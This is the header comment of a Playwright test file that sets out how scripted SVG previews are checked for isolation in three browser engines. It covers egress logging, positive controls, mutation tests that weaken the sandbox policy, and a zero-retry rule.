/**
 * preview-svg.spec.ts — ADR-067 stage 1, unit D2: SVG and type confusion.
 *
 * ============================================================================
 * WHY THIS FILE HAD TO EXIST BEFORE `.svg` COULD SHIP
 * ============================================================================
 *
 * §10.4 puts `.svg` on the inline allow-list and then states the condition in
 * the same breath: an SVG is reachable three ways, and "All three must pass
 * before `.svg` ships inline."
 *
 *   94   E2E_SvgWithScript_TopLevel_IsInert   — the token URL, as a DOCUMENT
 *   122  an SVG subresource renders and stays inert — inside a sandboxed bundle
 *   123  TestSvgInSpa_ImageNotDocument        — inside the SPA
 *
 * Test 123's server half exists (pkg/gateway/library_svg_contexts_test.go).
 * Tests 94 and 122 did not exist at all: tests/e2e/preview-isolation.spec.ts is
 * a `test.skip(true, …)` placeholder. `.svg` was already on the shipped
 * allow-list (pkg/gateway/library_mime.go), so a security posture was being
 * asserted with no browser evidence behind it. §10.4 says so itself:
 *
 *   > This is reasoned from the measured HTML result, not separately measured.
 *   > An SVG document under the §10.3 policy was never run.
 *
 * This file runs it. An SVG is not an image for security purposes — it is a
 * document that can carry script — so every assertion here is about what a
 * REAL ENGINE does with a REAL scripted SVG served by the REAL gateway.
 *
 * ============================================================================
 * GROUND TRUTH IS THE SECOND ORIGIN'S REQUEST LOG, NEVER THE PAGE
 * ============================================================================
 *
 * The measurement this file automates
 * (docs/internal/specs/adr-067-preview-isolation-experiment-2026-08-22.md)
 * fixed the oracle, and it is not negotiable:
 *
 *   > Both origins log every request they receive. What arrives was allowed;
 *   > what never arrives was blocked. The in-page JavaScript report is
 *   > corroborating only — a page can misreport what happened to it; a server
 *   > log cannot.
 *
 * So a SECOND origin (`egress`, a local HTTP server on its own ephemeral port)
 * stands in for the internet, and every "nothing leaked" assertion here is
 * "nothing ARRIVED at that server". A page that merely fails to render proves
 * nothing and is never accepted as evidence.
 *
 * Console text is explicitly NOT an oracle. The experiment recorded that the
 * three engines word a violation three different ways, so a string match
 * silently stops matching on a browser update (§4 item 4).
 *
 * ============================================================================
 * EVERY NEGATIVE HERE HAS A POSITIVE CONTROL IN THE SAME RUN
 * ============================================================================
 *
 * "Nothing reached the second origin" is also what a broken harness reports.
 * Each inert-case test is therefore paired with a control that fires the SAME
 * payload, generated by the SAME builder, at the SAME sink, with the isolation
 * removed — and the control MUST show the traffic. A third origin (`control`,
 * a second local server) provides the un-policed origin, exactly as the
 * experiment's `server.py` did.
 *
 * Two further tests, `MUTATION A` and `MUTATION B`, are the answer to "has this
 * test ever been seen to fail?". Each strips ONE half of the §10.3 policy and
 * asserts that the very property the tests above rely on collapses — the sandbox
 * half and the source half separately, because FR-005a's whole claim is that
 * neither alone is sufficient. Neither touches a source file, so both are
 * repeatable in CI on every run and cannot rot into folklore.
 *
 * They reach the mutation two different ways, and the difference is measured
 * rather than stylistic:
 *
 *   MUTATION A rewrites the header on the REAL gateway response in flight, via
 *   `page.route`. Its oracle is the opaque origin and the cookie read.
 *
 *   MUTATION B cannot use that mechanism, and the reason is worth recording
 *   because it would otherwise look like a false negative. A document delivered
 *   by `route.fulfill()` has no real network provenance, and Chromium then
 *   refuses every cross-origin subresource it issues to a loopback address —
 *   measured here: identical payload, identical `sandbox allow-scripts` header,
 *   `img`/`fetch`/`beacon` all fire and the in-page report is identical, yet the
 *   sink records NOTHING when the document arrived via `fulfill` and records all
 *   three when it arrived over the wire. A mutation harness that silently
 *   suppresses the very traffic it is trying to provoke would have "proved" the
 *   product safe. So MUTATION B is served over a real socket by the control
 *   origin instead — the SAME payload bytes, from the SAME origin as its paired
 *   negative, differing ONLY in the policy string, which is what makes the
 *   difference in outcome attributable to the policy and to nothing else.
 *
 * ============================================================================
 * RETRIES ARE ZERO, DELIBERATELY (SC-012, §13.4)
 * ============================================================================
 *
 * The suite-wide `retries: process.env.CI ? 3 : 2` exists for real-LLM latency
 * variance. Nothing here calls an LLM, and "the cookie was not readable" and
 * "nothing reached the external origin" are not properties a fourth attempt
 * establishes — a security assertion allowed to retry reports identically to
 * one that passed first time.
 *
 * Retries are therefore pinned to zero TWICE, on purpose:
 *   1. at PROJECT level — this file is listed in `ISOLATION_SPEC_FILES` in
 *      playwright.config.ts, and the three `isolation-*` projects set
 *      `retries: 0`, so raising the global number cannot reach it; and
 *   2. at FILE level, immediately below, so that running this file under any
 *      other project (or a future config edit) still cannot retry it.
 *
 * ============================================================================
 * ENGINES
 * ============================================================================
 *
 * Chromium, Firefox and WebKit, via the three `isolation-*` projects. WebKit is
 * not Safari and no macOS runner is planned — Safari proper stays uncovered,
 * deliberately and on the record (SC-012).
 */
